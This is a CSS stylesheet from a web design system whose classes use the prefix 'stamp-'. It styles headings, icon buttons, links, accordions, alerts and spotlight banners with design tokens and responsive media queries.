.stamp-heading--size-3-xl { letter-spacing: var(--stamp-text-heading-3-xl-letter-spacing); line-height: var(--stamp-text-heading-3-xl-line-height); font-weight: var(--stamp-text-heading-3-xl-font-weight); font-family: var(--stamp-text-heading-3-xl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

@media (min-width: 681px) {
  .stamp-heading--size-xs { font-size: var(--stamp-text-heading-xs-font-size); }
  .stamp-heading--size-s { font-size: var(--stamp-text-heading-s-font-size); }
  .stamp-heading--size-m { font-size: var(--stamp-text-heading-m-font-size); }
  .stamp-heading--size-l { font-size: var(--stamp-text-heading-l-font-size); }
  .stamp-heading--size-xl { font-size: var(--stamp-text-heading-xl-font-size); }
  .stamp-heading--size-xxl { font-size: var(--stamp-text-heading-xxl-font-size); }
  .stamp-heading--size-3-xl { font-size: var(--stamp-text-heading-3-xl-font-size); }
}

.stamp-heading--color-on-brand { color: var(--stamp-color-heading-on-brand); }

.stamp-heading--color-subtle { color: var(--stamp-color-heading-subtle); }

.stamp-heading--color-brand { color: var(--stamp-color-heading-brand); }

.stamp-heading--color-default { color: var(--stamp-color-heading-default); }

.stamp-icon { display: flex; }

.stamp-icon--size-s { inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-icon--size-m { inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-icon--size-l { inline-size: var(--stamp-size-icon-l); block-size: var(--stamp-size-icon-l); }

.stamp-icon__content { inline-size: inherit; block-size: inherit; display: flex; }

.stamp-icon svg { inline-size: 100%; block-size: 100%; }

.stamp-icon-button { display: inline-flex; flex-direction: column; align-items: center; justify-content: center; gap: var(--stamp-spacing-inner-s); }

.stamp-icon-button__button { display: inline-flex; gap: var(--stamp-spacing-inner-s); align-items: center; aspect-ratio: 1 / 1; max-inline-size: 100%; cursor: pointer; padding: var(--stamp-spacing-inner-s); border: medium; border-radius: var(--stamp-radius-xs); }

.stamp-icon-button__button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-icon-button__button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-icon-button__button--variant-primary:focus, .stamp-icon-button__button--variant-secondary:focus, .stamp-icon-button__button--variant-tertiary:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

@supports selector(:focus-visible) {
  .stamp-icon-button__button--variant-primary:focus, .stamp-icon-button__button--variant-secondary:focus, .stamp-icon-button__button--variant-tertiary:focus { outline: none; }
  .stamp-icon-button__button--variant-primary:focus-visible, .stamp-icon-button__button--variant-secondary:focus-visible, .stamp-icon-button__button--variant-tertiary:focus-visible { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }
}

.stamp-icon-button__button--variant-primary { background-color: var(--stamp-color-background-icon-button-primary-default); color: var(--stamp-color-icon-button-primary-default); }

.stamp-icon-button__button--variant-primary:active { background-color: var(--stamp-color-background-icon-button-primary-pressed); color: var(--stamp-color-icon-button-primary-pressed); }

.stamp-icon-button__button--variant-secondary { background-color: var(--stamp-color-background-icon-button-secondary-default); color: var(--stamp-color-icon-button-secondary-default); }

.stamp-icon-button__button--variant-secondary:active { background-color: var(--stamp-color-background-icon-button-secondary-pressed); color: var(--stamp-color-icon-button-secondary-pressed); }

.stamp-icon-button__button--variant-tertiary { background-color: var(--stamp-color-background-icon-button-tertiary-default); color: var(--stamp-color-icon-button-tertiary-default); }

.stamp-icon-button__button--variant-tertiary:active { background-color: var(--stamp-color-background-icon-button-tertiary-pressed); color: var(--stamp-color-icon-button-tertiary-pressed); }

.stamp-icon-button__button--size-s, .stamp-icon-button__button--size-m { padding: var(--stamp-spacing-inner-xs); }

.stamp-icon-button__button--size-l { padding: var(--stamp-spacing-inner-s); }

.stamp-icon-button__label { color: var(--stamp-color-text-icon-button-default); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); }

.stamp-icon-button__button:hover + .stamp-icon-button__label { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-icon-button__button:active + .stamp-icon-button__label { color: var(--stamp-color-text-icon-button-pressed); font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-illustration { --aspect-ratio-standard: 1/1; --aspect-ratio-medium: 6/5; display: flex; justify-content: center; align-items: center; inline-size: var(--stamp-size-illustration-m); }

.stamp-illustration--size-s { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-s); }

.stamp-illustration--size-m { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-m); }

.stamp-illustration--size-l { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-l); }

.stamp-illustration--size-xl { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xl); }

.stamp-illustration--size-xxl { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xxl); }

.stamp-illustration--size-medium-s { aspect-ratio: var(--aspect-ratio-medium); inline-size: var(--stamp-size-medium-illustration-s); }

.stamp-illustration--size-medium-m { aspect-ratio: var(--aspect-ratio-medium); inline-size: var(--stamp-size-medium-illustration-m); }

.stamp-illustration svg { inline-size: 100%; }

.stamp-image { inline-size: 100%; block-size: auto; }

.stamp-link, a.stamp-link { display: inline; cursor: pointer; border-radius: var(--stamp-radius-xs); border: medium; background: none; text-decoration: none; padding: 0px; color: var(--stamp-color-text-link-default); font-family: var(--stamp-text-link-l-default-font-family), sans-serif; font-weight: var(--stamp-text-link-l-default-font-weight); font-size: var(--stamp-text-link-l-default-font-size); line-height: var(--stamp-text-link-l-default-line-height); letter-spacing: var(--stamp-text-link-l-default-letter-spacing); }

.stamp-link:hover, a.stamp-link:hover { color: var(--stamp-color-text-link-hover); }

.stamp-link:active, a.stamp-link:active { color: var(--stamp-color-text-link-pressed); }

.stamp-link:focus, a.stamp-link:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 3px; }

@supports selector(:focus-visible) {
  .stamp-link:focus, a.stamp-link:focus { outline: none; }
  .stamp-link:focus-visible, a.stamp-link:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 3px; }
}

.stamp-link__icon { display: inline-flex; justify-content: center; vertical-align: middle; }

.stamp-link__icon--start { max-inline-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); margin-inline-end: var(--stamp-spacing-inner-xs); }

.stamp-link__icon--start svg { inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-link__icon--end { align-items: center; margin-inline-start: var(--stamp-spacing-inner-xs); max-inline-size: var(--stamp-size-icon-s); max-block-size: var(--stamp-size-icon-s); }

.stamp-link__icon--end svg { inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-link--size-s, a.stamp-link--size-s { font-family: var(--stamp-text-link-s-default-font-family), sans-serif; font-weight: var(--stamp-text-link-s-default-font-weight); font-size: var(--stamp-text-link-s-default-font-size); line-height: var(--stamp-text-link-s-default-line-height); letter-spacing: var(--stamp-text-link-s-default-letter-spacing); }

.stamp-link--size-s:active, a.stamp-link--size-s:active { font-family: var(--stamp-text-link-s-pressed-font-family), sans-serif; font-weight: var(--stamp-text-link-s-pressed-font-weight); font-size: var(--stamp-text-link-s-pressed-font-size); line-height: var(--stamp-text-link-s-pressed-line-height); letter-spacing: var(--stamp-text-link-s-pressed-letter-spacing); text-decoration: var(--stamp-text-link-s-pressed-text-decoration); }

.stamp-link--size-s:hover, a.stamp-link--size-s:hover { font-family: var(--stamp-text-link-s-hover-font-family), sans-serif; font-weight: var(--stamp-text-link-s-hover-font-weight); font-size: var(--stamp-text-link-s-hover-font-size); line-height: var(--stamp-text-link-s-hover-line-height); letter-spacing: var(--stamp-text-link-s-hover-letter-spacing); text-decoration: var(--stamp-text-link-s-hover-text-decoration); }

.stamp-link--size-m, a.stamp-link--size-m { font-family: var(--stamp-text-link-m-default-font-family), sans-serif; font-weight: var(--stamp-text-link-m-default-font-weight); font-size: var(--stamp-text-link-m-default-font-size); line-height: var(--stamp-text-link-m-default-line-height); letter-spacing: var(--stamp-text-link-m-default-letter-spacing); }

.stamp-link--size-m:active, a.stamp-link--size-m:active { font-family: var(--stamp-text-link-m-pressed-font-family), sans-serif; font-weight: var(--stamp-text-link-m-pressed-font-weight); font-size: var(--stamp-text-link-m-pressed-font-size); line-height: var(--stamp-text-link-m-pressed-line-height); letter-spacing: var(--stamp-text-link-m-pressed-letter-spacing); text-decoration: var(--stamp-text-link-m-pressed-text-decoration); }

.stamp-link--size-m:hover, a.stamp-link--size-m:hover { font-family: var(--stamp-text-link-m-hover-font-family), sans-serif; font-weight: var(--stamp-text-link-m-hover-font-weight); font-size: var(--stamp-text-link-m-hover-font-size); line-height: var(--stamp-text-link-m-hover-line-height); letter-spacing: var(--stamp-text-link-m-hover-letter-spacing); text-decoration: var(--stamp-text-link-m-hover-text-decoration); }

.stamp-link--size-l, a.stamp-link--size-l { font-family: var(--stamp-text-link-l-default-font-family), sans-serif; font-weight: var(--stamp-text-link-l-default-font-weight); font-size: var(--stamp-text-link-l-default-font-size); line-height: var(--stamp-text-link-l-default-line-height); letter-spacing: var(--stamp-text-link-l-default-letter-spacing); }

.stamp-link--size-l:active, a.stamp-link--size-l:active { font-family: var(--stamp-text-link-l-pressed-font-family), sans-serif; font-weight: var(--stamp-text-link-l-pressed-font-weight); font-size: var(--stamp-text-link-l-pressed-font-size); line-height: var(--stamp-text-link-l-pressed-line-height); letter-spacing: var(--stamp-text-link-l-pressed-letter-spacing); text-decoration: var(--stamp-text-link-l-pressed-text-decoration); }

.stamp-link--size-l:hover, a.stamp-link--size-l:hover { font-family: var(--stamp-text-link-l-hover-font-family), sans-serif; font-weight: var(--stamp-text-link-l-hover-font-weight); font-size: var(--stamp-text-link-l-hover-font-size); line-height: var(--stamp-text-link-l-hover-line-height); letter-spacing: var(--stamp-text-link-l-hover-letter-spacing); text-decoration: var(--stamp-text-link-l-hover-text-decoration); }

.stamp-cdn-icon { width: 100%; height: 100%; object-fit: contain; }

.stamp-fieldset { border: medium; display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-xl); inline-size: 100%; }

.stamp-fieldset + .stamp-fieldset { margin-block-start: calc(var(--stamp-spacing-inner-3-xl) - var(--stamp-spacing-inner-xl)); }

.stamp-fieldset > legend { margin-bottom: var(--stamp-spacing-inner-xl); }

.stamp-lottie-animation { block-size: 100%; inline-size: 100%; }

.stamp-accordion-item { inline-size: 100%; border-bottom: var(--stamp-border-width-s) solid var(--stamp-color-border-default); border-radius: var(--stamp-radius-xxs); }

.stamp-accordion-item__panel { padding: 0 0 var(--stamp-spacing-inner-l) 0; }

.stamp-accordion-item__header { font-size: var(--stamp-text-heading-xs-font-size); font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); }

.stamp-accordion-item__button { border-block: inherit; border-inline: inherit; border-start-start-radius: inherit; border-start-end-radius: inherit; border-end-start-radius: inherit; border-end-end-radius: inherit; overflow-block: inherit; overflow-inline: inherit; overscroll-behavior-block: inherit; overscroll-behavior-inline: inherit; margin-block: inherit; margin-inline: inherit; scroll-margin-block: inherit; scroll-margin-inline: inherit; padding-block: inherit; padding-inline: inherit; scroll-padding-block: inherit; scroll-padding-inline: inherit; inset-block: inherit; inset-inline: inherit; block-size: inherit; min-block-size: inherit; max-block-size: inherit; min-inline-size: inherit; max-inline-size: inherit; contain-intrinsic-block-size: inherit; contain-intrinsic-inline-size: inherit; background: inherit; background-blend-mode: inherit; border: inherit; border-radius: inherit; box-decoration-break: inherit; -moz-float-edge: inherit; position: inherit; float: inherit; clear: inherit; vertical-align: inherit; baseline-source: inherit; overflow: inherit; overflow-anchor: inherit; transform: inherit; rotate: inherit; scale: inherit; translate: inherit; offset: inherit; scroll-behavior: inherit; scroll-snap-align: inherit; scroll-snap-type: inherit; scroll-snap-stop: inherit; overscroll-behavior: inherit; isolation: inherit; break-after: inherit; break-before: inherit; break-inside: inherit; resize: inherit; perspective: inherit; perspective-origin: inherit; backface-visibility: inherit; transform-box: inherit; transform-style: inherit; transform-origin: inherit; contain: inherit; content-visibility: inherit; container: inherit; appearance: inherit; -moz-orient: inherit; will-change: inherit; shape-image-threshold: inherit; shape-margin: inherit; shape-outside: inherit; touch-action: inherit; -webkit-line-clamp: inherit; scrollbar-gutter: inherit; zoom: inherit; columns: inherit; column-fill: inherit; column-rule: inherit; column-span: inherit; content: inherit; counter-increment: inherit; counter-reset: inherit; counter-set: inherit; opacity: inherit; box-shadow: inherit; clip: inherit; filter: inherit; backdrop-filter: inherit; mix-blend-mode: inherit; font: inherit; font-synthesis: inherit; font-palette: inherit; math-depth: inherit; math-style: inherit; visibility: inherit; writing-mode: inherit; text-orientation: inherit; print-color-adjust: inherit; image-rendering: inherit; image-orientation: inherit; dominant-baseline: inherit; text-anchor: inherit; color-interpolation: inherit; color-interpolation-filters: inherit; fill: inherit; fill-opacity: inherit; fill-rule: inherit; shape-rendering: inherit; stroke: inherit; stroke-width: inherit; stroke-linecap: inherit; stroke-linejoin: inherit; stroke-miterlimit: inherit; stroke-opacity: inherit; stroke-dasharray: inherit; stroke-dashoffset: inherit; clip-rule: inherit; marker: inherit; paint-order: inherit; border-collapse: inherit; empty-cells: inherit; caption-side: inherit; border-spacing: inherit; color: inherit; text-transform: inherit; hyphens: inherit; -moz-text-size-adjust: inherit; text-indent: inherit; overflow-wrap: inherit; word-break: inherit; text-justify: inherit; text-align-last: inherit; text-align: inherit; letter-spacing: inherit; word-spacing: inherit; white-space: inherit; text-shadow: inherit; text-emphasis: inherit; text-emphasis-position: inherit; tab-size: inherit; line-break: inherit; -webkit-text-fill-color: inherit; -webkit-text-stroke: inherit; ruby-align: inherit; ruby-position: inherit; text-combine-upright: inherit; text-rendering: inherit; text-underline-offset: inherit; text-underline-position: inherit; text-decoration-skip-ink: inherit; hyphenate-character: inherit; forced-color-adjust: inherit; -webkit-text-security: inherit; hyphenate-limit-chars: inherit; text-wrap: inherit; pointer-events: inherit; caret-color: inherit; accent-color: inherit; color-scheme: inherit; scrollbar-color: inherit; list-style: inherit; quotes: inherit; margin: inherit; overflow-clip-margin: inherit; scroll-margin: inherit; outline: inherit; outline-offset: inherit; scroll-padding: inherit; page: inherit; inset: inherit; z-index: inherit; flex-flow: inherit; place-content: inherit; justify-items: inherit; flex: inherit; place-self: inherit; order: inherit; height: inherit; min-height: inherit; max-height: inherit; width: inherit; min-width: inherit; max-width: inherit; box-sizing: inherit; object-fit: inherit; object-position: inherit; grid-area: inherit; grid: inherit; aspect-ratio: inherit; contain-intrinsic-size: inherit; vector-effect: inherit; stop-color: inherit; stop-opacity: inherit; flood-color: inherit; flood-opacity: inherit; lighting-color: inherit; mask-type: inherit; clip-path: inherit; mask: inherit; x: inherit; y: inherit; cx: inherit; cy: inherit; rx: inherit; ry: inherit; r: inherit; d: inherit; table-layout: inherit; text-overflow: inherit; text-decoration: inherit; ime-mode: inherit; scrollbar-width: inherit; user-select: inherit; -moz-window-dragging: inherit; -moz-force-broken-image-icon: inherit; transition: inherit; animation: inherit; animation-composition: inherit; -moz-box-align: inherit; -moz-box-direction: inherit; -moz-box-flex: inherit; -moz-box-orient: inherit; -moz-box-pack: inherit; -moz-box-ordinal-group: inherit; display: flex; align-items: center; inline-size: 100%; padding: var(--stamp-spacing-inner-l) 0; cursor: pointer; gap: var(--stamp-spacing-inner-l); }

.stamp-accordion-item__icon { display: flex; align-items: center; justify-content: center; color: var(--stamp-color-icon-default); inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-accordion-item__icon--end { margin-right: var(--stamp-spacing-inner-l); margin-left: auto; }

.stamp-accordion-item__button:focus .stamp-accordion-item__icon--end { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-accordion-item__title { color: var(--stamp-color-text-link-default); }

.stamp-accordion-item__button:focus .stamp-accordion-item__title { color: var(--stamp-color-text-link-default); text-decoration: underline; }

.stamp-accordion-item__button:hover .stamp-accordion-item__title { color: var(--stamp-color-text-link-hover); text-decoration: underline; }

@supports selector(:focus-visible) {
  .stamp-accordion-item__button:focus .stamp-accordion-item__icon--end { outline: none; }
  .stamp-accordion-item__button:focus .stamp-accordion-item__title { text-decoration: none; color: var(--stamp-color-text-link-default); }
  .stamp-accordion-item__button:focus-visible .stamp-accordion-item__icon--end { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }
  .stamp-accordion-item__button:focus-visible .stamp-accordion-item__title { color: var(--stamp-color-text-link-pressed); text-decoration: underline; }
}

.stamp-alert { display: inline-flex; align-items: flex-start; max-inline-size: 536px; padding: var(--stamp-spacing-inner-l); border-style: solid; border-width: var(--stamp-border-width-s); align-self: flex-start; inline-size: 100%; border-radius: var(--stamp-radius-s); }

.stamp-alert__wrapper { position: relative; z-index: var(--z-index-above); inline-size: fit-content; background-color: var(--stamp-color-background-surface); }

@media (min-width: 400px) {
  .stamp-alert { inline-size: auto; min-inline-size: 300px; }
}

.stamp-alert--primary { border-color: inherit; }

.stamp-alert--secondary { border-color: var(--stamp-color-border-default); background-color: var(--stamp-color-background-surface); }

.stamp-alert--tertiary { border-color: transparent; padding-inline: 0px; }

.stamp-alert--success:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-positive); background-color: var(--stamp-color-background-positive); }

.stamp-alert--warning:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-warning); background-color: var(--stamp-color-background-warning); }

.stamp-alert--error:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-negative); background-color: var(--stamp-color-background-negative); }

.stamp-alert--information:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-informative); background-color: var(--stamp-color-background-informative); }

.stamp-alert__content { display: flex; flex-direction: column; margin-inline: var(--stamp-spacing-inner-m); flex-grow: 1; }

.stamp-alert__header, .stamp-alert__body, .stamp-alert__footer { word-break: break-word; }

.stamp-alert__body { font-size: var(--stamp-text-body-m-default-font-size); font-weight: var(--stamp-text-body-m-default-font-weight); }

.stamp-alert__icon { display: flex; inline-size: 24px; block-size: 24px; }

.stamp-alert__dismiss-button { cursor: pointer; background-color: transparent; border: medium; color: var(--stamp-color-icon-subtle); }

.stamp-alert__dismiss-button:hover { color: var(--stamp-color-icon-hover); }

.stamp-alert__dismiss-button:active { color: var(--stamp-color-icon-pressed); }

.stamp-alert__dismiss-button:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-alert__dismiss-button:focus { outline: none; }
  .stamp-alert__dismiss-button:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }
}

.stamp-alert__dismiss-icon { display: flex; }

.stamp-alert a { border-radius: var(--stamp-radius-s); }

.stamp-alert a:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-alert a:not(:disabled):focus { outline: none; }
  .stamp-alert a:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-alert-stack { display: flex; flex-direction: column; border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-default); border-radius: var(--stamp-radius-s); max-inline-size: 536px; background-color: var(--stamp-color-background-surface); }

.stamp-alert-stack-item { display: flex; gap: var(--stamp-spacing-inner-m); padding: var(--stamp-spacing-inner-m); }

.stamp-alert-stack-item + .stamp-alert-stack-item { border-block-start-style: solid; border-block-start-width: var(--stamp-border-width-s); border-block-start-color: var(--stamp-color-border-default); }

.stamp-alert-stack-item__icon { block-size: var(--stamp-size-icon-m); inline-size: var(--stamp-size-icon-m); }

.stamp-banner-container { inline-size: 100%; block-size: 100%; display: flex; flex-direction: column; align-items: center; padding-inline: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-outer-m); }

@media screen and (min-width: 680px) {
  .stamp-banner-container { margin-block-end: 0px; }
}

.stamp-banner-container--primary { background-color: var(--stamp-color-background-brand-subtle); }

.stamp-banner-container--secondary { background-color: var(--stamp-color-background-default); }

.stamp-banner-container__content-wrapper { background-color: var(--stamp-color-background-surface); border-radius: var(--stamp-radius-m); transform: translateY(var(--stamp-spacing-outer-m)); inline-size: 100%; max-inline-size: 532px; text-align: center; }

.stamp-banner-container__content { padding-inline: var(--stamp-spacing-inner-l); padding-block-start: var(--stamp-spacing-inner-3-xl); }

@media screen and (min-width: 680px) {
  .stamp-banner-container__content { padding-inline: var(--stamp-spacing-inner-xxl); }
}

.stamp-banner-container__content-bottom { background-color: var(--stamp-color-background-surface); height: var(--stamp-spacing-outer-m); border-block-width: 0px 1px; border-inline-width: 1px; border-style: solid; border-color: var(--stamp-color-border-default); margin: 0px -1px; border-radius: 0 0 var(--stamp-radius-m) var(--stamp-radius-m); }

.stamp-spotlight-banner { position: relative; z-index: var(--z-index-base); padding-block: var(--stamp-spacing-outer-m) 0; }

.stamp-spotlight-banner--media-type-image { --image-inline-size: 100vw; --image-block-size: auto; --image-max-block-size: 200px; --decoration-offset: 62px; }

.stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(275px, 50px + 62.5vi, 350px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); --decoration-offset: 36px; display: flex; justify-content: space-around; flex-direction: column; min-block-size: var(--illustration-size); }

.stamp-spotlight-banner__content { position: relative; display: grid; grid-template-areas: &quot;header&quot; &quot;body&quot; &quot;footer&quot; &quot;media&quot;; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; }

.stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { padding-block: var(--illustration-block-padding); }

.stamp-spotlight-banner__text { margin-inline-end: var(--decoration-offset); }

.stamp-spotlight-banner__header, .stamp-spotlight-banner__body, .stamp-spotlight-banner__footer { display: flex; flex-direction: column; }

.stamp-spotlight-banner__header { grid-area: header; gap: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-inner-xxl); }

.stamp-spotlight-banner__body { grid-area: body; margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-spotlight-banner__footer { grid-area: footer; flex-flow: wrap; align-items: center; column-gap: var(--stamp-spacing-inner-xxl); row-gap: var(--stamp-spacing-inner-xl); margin-block-start: var(--stamp-spacing-inner-xxl); }

.stamp-spotlight-banner__media { grid-area: media; overflow: hidden; }

.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media { position: relative; inset-inline: 50%; margin-block-start: var(--stamp-spacing-inner-3-xl); margin-inline: -50vw; inline-size: var(--image-inline-size); block-size: var(--image-block-size); max-block-size: var(--image-max-block-size); }

.stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__media { display: flex; align-items: center; margin-inline: auto; block-size: var(--illustration-size); inline-size: var(--illustration-size); }

.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media img, .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media picture { display: block; inline-size: 100%; block-size: 100%; object-fit: cover; }

.stamp-spotlight-banner__decoration-container { position: absolute; z-index: var(--z-index-below); block-size: var(--decoration-block-size); inline-size: var(--decoration-inline-size); }

.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { --decoration-block-size: 360px; --decoration-inline-size: 362px; --decoration-stroke-width: 12px; --decoration-rotation: 180deg; inset-inline-start: calc(-115px + 100vw); inset-block-end: 85px; }

.stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 823px; --decoration-inline-size: 829px; --decoration-stroke-width: 6px; --decoration-rotation: 70deg; inset-inline-end: -567px; inset-block-end: calc((var(--illustration-size) / 2) - 30px); transform: translateX(-50%); }

.stamp-spotlight-banner__decoration { transform: rotate(var(--decoration-rotation)); transform-origin: center center 0px; }

.stamp-spotlight-banner__decoration path { stroke-width: var(--decoration-stroke-width); }

@media (max-width: 479px) {
  .stamp-spotlight-banner--reduced-postline.stamp-spotlight-banner--media-type-image { --decoration-offset: 0; }
  .stamp-spotlight-banner--reduced-postline.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { display: none; }
}

@media (min-width: 480px) {
  .stamp-spotlight-banner--media-type-image { --decoration-offset: 122px; }
  .stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(170px, -142px + 65vi, 300px); --illustration-block-padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-xxl); --decoration-offset: 0; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-rows: repeat(3, auto); grid-template-columns: 1fr var(--illustration-size); column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__header { gap: var(--stamp-spacing-inner-m); margin-block-end: 0px; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__body, .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__footer { margin-block-start: 0px; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__header + .stamp-spotlight-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__header + .stamp-spotlight-banner__footer, .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__body + .stamp-spotlight-banner__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__media { position: absolute; align-self: center; margin-inline: unset; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { inset-inline-start: calc(-174px + 100vw); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1087px; --decoration-inline-size: 1100px; --decoration-stroke-width: 4px; --decoration-rotation: 0deg; inset-inline-end: calc((var(--illustration-size) / 2) - 60px); inset-block-end: calc(50% - (var(--decoration-block-size) / 2)); transform: translateX(0px); }
}

@media (min-width: 680px) {
  .stamp-spotlight-banner { padding-block: 0px; }
  .stamp-spotlight-banner--media-type-image { --image-inline-size: 100vw; --image-block-size: 400px; --decoration-offset: 103px; }
  .stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(250px, 80px + 25vi, 300px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__content { grid-template-areas: &quot;header&quot; &quot;body&quot; &quot;footer&quot; &quot;media&quot;; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { display: grid; grid-template-areas: &quot;text media&quot;; grid-template-rows: auto; grid-template-columns: minmax(0, 1fr) var(--illustration-size); column-gap: var(--stamp-spacing-inner-3-xl); min-block-size: 324px; }
  .stamp-spotlight-banner__text { padding-block: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__text { grid-area: text; align-self: center; display: flex; flex-direction: column; gap: 0px; }
  .stamp-spotlight-banner__header, .stamp-spotlight-banner__body, .stamp-spotlight-banner__footer { margin-inline-start: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner__header { gap: var(--stamp-spacing-inner-m); margin-block-start: var(--stamp-spacing-outer-m); margin-block-end: var(--stamp-spacing-inner-xxl); }
  .stamp-spotlight-banner__body { margin-block-end: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media { max-block-size: var(--image-block-size); block-size: var(--image-block-size); inline-size: var(--image-inline-size); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__media { align-self: center; position: absolute; inset-inline-end: 0px; grid-area: 1 / 2 / -1; margin-inline: unset; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { --decoration-block-size: 438px; --decoration-inline-size: 441px; --decoration-stroke-width: 11px; inset-inline-start: calc(-190px + 100vw); inset-block-end: calc(var(--image-block-size) - 140px); }
